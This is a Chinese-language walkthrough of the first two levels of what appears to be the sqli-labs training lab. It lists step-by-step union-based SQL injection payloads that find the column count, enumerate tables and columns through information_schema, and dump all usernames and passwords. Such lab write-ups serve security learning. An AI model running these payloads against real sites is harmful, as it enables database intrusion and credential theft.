# Less-1

1. `?id=1` 查询到数据显示在页面上；
2. `?id=1'` 测试保存，推测存在注入；
3. `?id=2-1` 页面数据改变，进一步测试与 `?id=2` 结果相同，即不支持数学运算，为字符型注入； -- 单引号闭合与注释
4. `?id=1' order by 4 --+` 从 1 递增测试列数，直到 4 报错 `Unknown column '4' in 'order clause'` 说明列数为3；
5. `?id=-1' union select 1,2,3 --+` 让位测试回显位，发现第 2 列和第 3 列是回显位；
6. `?id=-1' union select 1,database(),version() --+` 查看当前库名（security）和数据库版本；
7. `?id=-1' union select 1,group_concat(table_name),3  from information_schema.tables where table_schema='security'--+` 查询 `security` 库中的所有表名，单行拼接。（emails,referers,uagents,users）-- 判断敏感信息在 users 表中；
8. `?id=-1' union select 1,group_concat(column_name),3  from information_schema.columns where table_name='users'--+` 查询 users 表中的所有列名；（USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password）-- 看到一开始查询的 id 列，还有目标 username 和 password；
9. `?id=-1' union select 1,group_concat(username,':',password),3  from users --+` 从 users 表中以 `username:password` 单行拼接的形式查询所有数据。（同理可以查到 id 能查询哪些）；
10. 通关！

## Less-2

1. `?id=2-1` 与 `?id=1` 结果相同，判断是数字型注入；-- 不用闭合单引号
2. `?id=1 order by 4 --+` 同 Less-1，列数为 3；
3. `?id=-1 union select 1,2,3 --+`
4. `?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+` -- 优化 Less-1 的逻辑，直接查询当前库的所有表名；
5. `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`
6. `?id=-1 union select 1,group_concat(username,':',password),3 from users --+`
7. 通关！
